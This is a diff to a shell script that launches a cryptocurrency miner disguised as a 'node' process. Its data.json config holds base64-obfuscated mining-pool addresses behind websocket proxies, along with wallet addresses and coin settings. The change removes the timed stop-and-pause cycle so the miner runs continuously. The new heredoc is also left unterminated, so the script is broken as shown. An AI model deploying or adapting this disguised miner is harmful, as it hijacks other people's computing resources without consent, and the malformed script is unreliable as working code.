@@ -9,27 +9,15 @@ while true; do
   chmod +x ./node
   
   # Write the configuration to data.json
-  cat <<EOF > data.json
-{
-  "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
-  "config": { "threads": 48, "log": true },
-  "options": { "user": "RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi", "password": "c=RVN", "argent": "robin" }
-}
-EOF
+  cat > data.json <<END
+  {
+    "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
+    "config": { "threads": 1, "log": true },
+    "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.Test", "password": "c=MAZA,m=solo", "argent": "Web-Wasm-Reloaded/1.0" }
+  }
 
   # Start the node process in the background and capture its PID
   ./node app.js &
   pid=$!
 
-  echo "Started node with PID $pid. Running for 2 minutes..."
-  
-  # Let the process run for 2 minutes (120 seconds)
-  sleep 120
-  
-  # Terminate the node process
-  kill $pid
-  echo "Terminated node process with PID $pid."
-  
-  # Wait for 2 minutes before starting the next cycle
-  sleep 120
 done
